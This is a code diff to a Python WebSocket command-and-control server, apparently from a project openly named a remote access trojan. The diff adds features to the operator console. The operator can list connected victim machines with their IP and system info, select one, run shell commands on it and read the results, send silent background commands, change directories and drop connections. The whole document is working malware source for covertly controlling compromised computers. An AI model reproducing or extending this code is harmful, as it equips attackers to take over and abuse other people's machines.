@@ -6,7 +6,6 @@ import websockets
 import ssl
 import rich
 import json
-from time import sleep
 from sys import exit
 
 from rich.console import Console
@@ -24,8 +23,8 @@ rich.traceback.install(show_locals=True)
 # SSL_KEY: SSL私钥文件路径
 HOST = '0.0.0.0' 
 PORT = 8765
-SSL_CERT = 'cert.pem' 
-SSL_KEY = 'key.pem' 
+SSL_CERT = '../cert.pem' 
+SSL_KEY = '../key.pem' 
 
 # --- 全局变量 ---
 # control_list: 存储所有连接的客户端信息
@@ -59,11 +58,8 @@ class Printer:
         """输出调试级别日志"""
         self.console.log(f"[grey50][|][/grey50]", message, style="grey50")
 
-class Exit_Exception(Exception):
-    """自定义退出异常类"""
-    pass
-
 def output(*args, type=""):
+    # 日志输出函数，根据类型调用不同的打印方法
     printer = Printer()
     if type.strip() == "":
         printer.console.log(*args)
@@ -116,6 +112,7 @@ class Server:
         else:
             output(f"当前已连接的设备有{len(control_list)}台", type="info")
             output("已连接的设备列表：", type="info")
+            # 使用rich库的Table类创建表格
             table = Table(
                 title="设备信息",
                 title_style="bold blue",
@@ -127,14 +124,17 @@ class Server:
             table.add_column("[bold red]设备ID[/bold red]")
             table.add_column("[bold #FFA500]IP地址[/bold #FFA500]")
             table.add_column("[bold yellow]连接状态[/bold yellow]")
+            table.add_column("[bold green]系统信息[/bold green]")
             for device in control_list.items():
                 table.add_row(f"{device[0]}", 
                               f"{device[1]['ip']}", 
-                              f"{device[1]['status']}")
+                              f"{device[1]['status']}",
+                              f"{device[1]['systeminfo']}")
             output(table, type="info")
             del table
 
     def select(self, id):
+        """选择要控制的客户端"""
         global select_client
         if id in control_list:
             select_client = id
@@ -143,7 +143,8 @@ class Server:
             output(f"设备ID为{id}的设备不存在。", type="error")
     
     async def delete(self, id):
-        global control_list
+        """删除指定的客户端连接"""
+        global control_list, select_client
         if id in control_list:
             websocket = control_list[id]['websocket']
             try:
@@ -151,6 +152,9 @@ class Server:
             except Exception as e:
                 output(f"断开设备ID为{id}的连接时发生异常: {e}", type="warning")
             control_list.pop(id)
+            if select_client == id:
+                select_client = None
+                output("删除的设备是你当前控制的设备，已自动返回到上一级", type="info")
             output(f"成功删除ID为{id}的设备。", type="success")
         else:
             output(f"设备ID为{id}的设备不存在。", type="error")
@@ -166,17 +170,31 @@ class ControlClient:
         """显示客户端控制帮助信息"""
         help_text = '''帮助信息：
 [u bold yellow]help[/u bold yellow]：[green]显示帮助信息[/green]
+[u bold yellow]about[/u bold yellow]：[green]显示关于信息[/green]
 [u bold yellow]back[/u bold yellow]：[green]退出到上一级[/green]
 [u bold yellow]clear[/u bold yellow]：[green]清空终端屏幕[/green]
+[u bold yellow]list[/u bold yellow]：[green]显示已连接的设备列表[/green]
+[u bold yellow]select <id>[/u bold yellow]：[green]选择一个设备进行控制[/green]
+[u bold yellow]delete <id>[/u bold yellow]：[green]删除已连接的设备[/green]
 [u bold yellow]command[/u bold yellow]：[green]进入command,可在对方下命令并返回结果[/green]
+[u bold yellow]background <command>[/u bold yellow]：[green]在后台运行命令，不返回结果[/green]
 [u bold yellow]cd <dir>[/u bold yellow]：[green]切换工作目录[/green]'''
         output(help_text, type="info")
     
     async def execute_command(self, command):
+        """执行命令并返回结果"""
         await self.websocket.send(f"command:{command}")
         result = await self.websocket.recv()
         return result
+
+    async def background(self, command):
+        """在后台执行命令"""
+        await self.websocket.send(f"background:{command}")
+        await self.websocket.recv()
+        output("命令已发送", type="success")
+
     async def change_directory(self, directory):
+        """切换工作目录"""
         await self.websocket.send(f"cd:{directory}")
         result = await self.websocket.recv()
         return result
@@ -184,37 +202,41 @@ class ControlClient:
 
 # --- 被客户端连接处理逻辑 ---
 async def handle_client(websocket):
+    """处理新的客户端连接"""
     ip = websocket.remote_address[0] + ":" + str(websocket.remote_address[1])
-    device_info = {
-        "id": str(websocket.id),
+    try:
+        systeminfo = await websocket.recv()
+    except Exception:
+        systeminfo = "ERROR"
+    # 将新客户端信息添加到控制列表
+    control_list[str(websocket.id)] = {
         "ip": ip,
         "status": "connected",
-        "websocket": websocket
-    }
-    control_list[device_info['id']] = {
-        "ip": device_info['ip'],
-        "status": device_info['status'],
-        "websocket": device_info['websocket']
+        "websocket": websocket,
+        "systeminfo": systeminfo
     }
     await websocket.wait_closed()
     
 # --- 检查客户端连接状态 ---
 async def check_clients_connection():
+    """定期检查所有客户端的连接状态"""
     global control_list
     while True:
         if len(control_list) > 0:
             for device in control_list.items():
-                if select_client == device[0]:
-                    control_list[device[0]]['status'] = "used"
                 try:
+                    # 发送ping包检查连接
                     await device[1]['websocket'].ping()
                     control_list[device[0]]['status'] = "connected"
+                    if select_client == device[0]:
+                        control_list[device[0]]['status'] = "used"
                 except:
                     control_list[device[0]]['status'] = "disconnected"
         await asyncio.sleep(10)
 
 # --- 用户交互逻辑 ---
 async def input_loop():
+    """处理用户输入的主循环"""
     global select_client, control_list
 
     server = Server()
@@ -227,7 +249,7 @@ async def input_loop():
                 case "": continue
                 case "help": server.help()
                 case "about": server.about()
-                case "exit": raise Exit_Exception
+                case "exit": output("程序已正常退出。", type="success");exit()
                 case "clear": print("\033[H\033[J")
                 case "list": server.client_list()
                 case command if command.startswith("select"): 
@@ -243,38 +265,63 @@ async def input_loop():
             match command:
                 case "": continue
                 case "help": control_client.help()
+                case "about": server.about()
                 case "back": select_client = None
                 case "clear": print("\033[H\033[J")
+                case "list": server.client_list()
+                case command if command.startswith("select"): 
+                    server.select(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("请输入设备ID。", type="error")
+                case command if command.startswith("delete"):
+                    await server.delete(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("请输入设备ID。", type="error")
                 case "command":
                     # 命令执行模式
                     while True:
                         try:
-                            command = await asyncio.to_thread(input, "(command)({select_client})> ")
+                            command = await asyncio.to_thread(input, f"(command)({select_client})> ")
                             if command == "exit":
                                 break
                             else:
+                                if command.strip() == "":
+                                    continue
                                 result = await control_client.execute_command(command)
                                 result = json.loads(result)
                                 for key, value in result.items():
                                     output(f"[bold cyan]{key}:[/bold cyan] {value}")
                         except Exception as e:
                             output(f"执行命令时发生异常: {e}", type="error")
+                case command if command.startswith("background"):
+                    try:
+                        await control_client.background(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("请输入命令。", type="error")
+                    except Exception as e:
+                        output(f"后台运行命令时发生异常: {e}", type="error")
                 case command if command.startswith("cd"):
-                    result = await control_client.change_directory(command.split(maxsplit=1)[1]);output(result, type="info") if len(command.split(maxsplit=1)) > 1 else output("请输入切换目录。", type="error")
+                    try:
+                        result = await control_client.change_directory(command.split(maxsplit=1)[1]);output(result, type="info") if len(command.split(maxsplit=1)) > 1 else output("请输入切换目录。", type="error")
+                    except Exception as e:
+                        output(f"切换目录时发生异常: {e}", type="error")
                 case _: output(f"未知命令: {command}，请输入help来查看可用命令。", type="error")
 
 # --- 主函数 ---
 async def server_loop():
+    """启动服务器的主循环"""
     output(f"正在配置证书文件, 证书位置: {SSL_CERT}, 密钥位置: {SSL_KEY}", type="info")
-    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-    ssl_context.load_cert_chain(SSL_CERT, SSL_KEY)
+    try:
+        # 配置SSL上下文
+        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        ssl_context.load_cert_chain(SSL_CERT, SSL_KEY)
+    except FileNotFoundError:
+        output("证书文件或密钥文件不存在，请检查配置。", type="error")
+        exit()
 
     output(f"正在启动服务器, 监听地址: {HOST}, 端口: {PORT}", type="info")
+    # 启动WebSocket服务器
     async with websockets.serve(handle_client, HOST, PORT, ssl=ssl_context):
         await asyncio.Future()
 
 async def main():
+    """程序主入口"""
     output("正在启动程序...", type="info")
+    # 并发运行服务器、输入循环和连接检查
     await asyncio.gather(
         server_loop(),
         input_loop(),
@@ -289,6 +336,5 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         output("用户手动中断程序。", type="warning")
         exit()
-    except Exit_Exception:
-        output("程序已正常退出。", type="success")
-        exit()
+    except Exception as e:
+        output(f"错误: {e}，请报告到[link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]", type="error")
